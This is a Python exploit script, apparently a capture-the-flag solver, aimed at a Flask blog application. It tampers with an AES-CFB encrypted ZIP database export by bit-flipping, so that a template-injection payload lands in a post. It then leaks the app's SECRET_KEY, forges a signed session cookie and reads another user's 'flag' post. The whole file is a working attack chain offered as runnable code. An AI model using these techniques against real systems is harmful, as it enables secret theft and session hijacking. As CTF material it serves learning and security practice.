#!/usr/bin/env python

import base64
import json
import requests
import base64
import zlib
import string
import time
import re
import html
from pwn import p16, p32
from crc import Calculator, Crc32
import codecs
from flask import Flask, session
from flask.sessions import SecureCookieSessionInterface
from itertools import product
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
parser.add_argument('-v', action="store_true")
args = parser.parse_args()

HOST = args.host
PORT = args.port
USERNAME = "anony"
PASSWORD = "dupa.8"
VERBOSE = args.v

BLOG_TITLE = "solver"
BLOCK_TO_MODIFY = "author}}AAAAAAAA"
PAYLOAD = "config}}}}\",{crc}]}}"
FLAG_WORKDIR = "a0e402ee09c3c146034ee7d657a11084"

CRC = Calculator(Crc32.CRC32, True)


def log(*msg):
    if VERBOSE:
        print(' '.join(msg))


def decode_cookie(session):
    if session.startswith('.'):
        is_compressed = True
        session = session[1:]
    
    sess = session.split('.')[0]
    data = base64.urlsafe_b64decode(sess + '=' * (-len(sess) % 4))
    if is_compressed:
        data = zlib.decompress(data)

    return json.loads(data)


def crc(s):
    return CRC.checksum(str(s).encode())


def add_post(s, title, content):
    r = s.post(f"http://{HOST}:{PORT}/api/new", json={
        "title": title,
        "content": content
    })


def read_post(s, title):
    return s.get(f"http://{HOST}:{PORT}/post/{title}").text


def get_published_date(s):
    r = s.get(f"http://{HOST}:{PORT}/")

    return r.text.split('Published on')[1].split('by')[0].strip()


def export(s):
    r = s.get(f"http://{HOST}:{PORT}/api/export").json()

    return base64.b64decode(r['export'])


def brute_content_crc(prefix_len, suffix):  # pre-calculated -> aaaaaaaaaaaaaaaaagbvo
    log('[*] Generating 4 digit CRC32 for content')
    return 'aaaaaaaaaaaaaaaaagbvo' # pre-calculated

    for prefix in product(string.ascii_lowercase, repeat=prefix_len):
        prefix = ''.join(prefix)
        if len(str(crc(prefix + suffix))) == 4:
            return prefix


def generate_db(s, title, content):
    while True:
        add_post(s, title, content)
        date = get_published_date(s)

        if len(str(crc(date))) == 10:
            break
        
    return export(s), date


def xor(d1, d2):
    if isinstance(d1, str):
        d1 = d1.encode()
    if isinstance(d2, str):
        d2 = d2.encode()

    return bytes([a ^ b for a, b in zip(d1, d2)])


def inject_payload(db, pos, payload, base=None):
    if base is not None:
        payload = xor(payload, base)

    new_db = db[:pos]
    new_db += xor(db[pos:pos+len(payload)], payload)
    new_db += db[pos+len(payload):]

    return new_db


def import_db(s, data):
    r = s.post(f"http://{HOST}:{PORT}/api/import", json={
        "import": base64.b64encode(data).decode('latin-1')
    }).json()

    return r['result'] == 'OK'


def leak_secret(s, title):
    r = s.get(f"http://{HOST}:{PORT}/post/{title}")

    return codecs.escape_decode(re.findall(r'SECRET_KEY[\'"]: b[\'"](.+?)[\'"], [\'"]PERMANENT_SESSION_LIFETIME', html.unescape(r.text))[0])[0]

# Login to app
log("[*] Log in to app")

s = requests.session()
r = s.post(f"http://{HOST}:{PORT}/api/login", json={
    "username": USERNAME, 
    "password": PASSWORD
})

session = decode_cookie(r.cookies['session'])
username = session['username']
passhash = session['passhash']
workdir = session['workdir']

# Calculate position of content in ZIP
data = {
    "title": [BLOG_TITLE, crc(BLOG_TITLE)],
    "id": [BLOG_TITLE, crc(BLOG_TITLE)],
    "date": ["YYYY/MM/DD hh:mm:ss", 0xffffffff],  # To make it simpler I'll assume that CRC32 from Date will be 10 digits (most frequent). Will generate again otherwise
    "author": [USERNAME, crc(USERNAME)],
    "content": ["PAYLOAD_START", 0xffff]
}
filename = f"post/{workdir}/{BLOG_TITLE}.json"

content_pos  = 16  # IV
content_pos += 30  # ZIP LCH
content_pos += len(filename)
content_pos += json.dumps(data).find("PAYLOAD_START")
log("[*] Calculated expected content position in ZIP:", hex(content_pos))

# Prepare blog content
content = ""
if content_pos % 16 >= 14:  # We need to have {{ at the end of previous block, appending to next block
    content += "A" * 3
content += "A" * 16  # Obsolete, used during generating 4 digit CRC32
content += "A" * (14 - content_pos % 16) + "{{"
content += BLOCK_TO_MODIFY
content += "B" * 16  # This will be replaced with trash from AES CFB. Avoid to override ZIP structure

# Create & dump blog post with expected length
brute_crc_start = time.time()
prefix_len = content.find("{{")
prefix = brute_content_crc(prefix_len, "{{" + PAYLOAD.format(crc=0).split('"')[0])
content = prefix + content[prefix_len:]
log(f"[*] Bruted content CRC in {int(time.time() - brute_crc_start)}s")

# Append content so we align timestamps/crc-32/file sizes with new AES block that we'll modify
while True:
    data['content'] = [content, crc(content)]
    if (30 + len(filename) + len(json.dumps(data)) + 10) % 16 == 0:  # 30 bytes of ZIP LCH, 12 bytes of ZIP CDFH before timestamps
        break
    content += "B"

db, date = generate_db(s, BLOG_TITLE, content)

# Inject payload to ZIP
payload_pos = content_pos + content.find(BLOCK_TO_MODIFY)
log("[*] Payload position in ZIP:", hex(payload_pos))

data["date"] = [date, crc(date)]
base_file_length = len(json.dumps(data))
base_file_crc = crc(json.dumps(data))
zip_pos = 16 + 30 + len(filename) + len(json.dumps(data)) + 10

new_content = prefix + "{{" + PAYLOAD.format(crc=0).split('"')[0]
new_db = inject_payload(db, payload_pos, PAYLOAD.format(crc=crc(new_content)), base=BLOCK_TO_MODIFY)
new_file = json.dumps(data)
new_file = new_file[:new_file.find(BLOCK_TO_MODIFY)] + PAYLOAD.format(crc=crc(new_content))
new_file_length = len(new_file) ^ base_file_length
new_file_crc = crc(new_file) ^ base_file_crc


zip_payload = p16(0)
zip_payload += p32(0)
zip_payload += p32(new_file_crc)
zip_payload += p32(new_file_length)
zip_payload += p16(new_file_length)
to_import = inject_payload(new_db, zip_pos, zip_payload)

# Import modified db
if not import_db(s, to_import):
    log("[*] Looks like something went wrong :(")
    exit()

log("[*] Uploaded successfully!")

# with open("payload.db", "wb") as f:
#     f.write(base64.b64encode(to_import)) 

secret_key = leak_secret(s, BLOG_TITLE)
log(f"[*] Leaked app secret {secret_key}")

app = Flask("exploit")
app.secret_key = secret_key
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

new_session = session_serializer.dumps({
    'username': username,
    'passhash': passhash,
    'workdir': FLAG_WORKDIR
})
log(f"[*] Created signed session: {new_session}")

s.cookies.set("session", new_session)
post_content = read_post(s, "flag")
 
print(re.findall(r'<h1>(.+?)</h1>', post_content)[0])
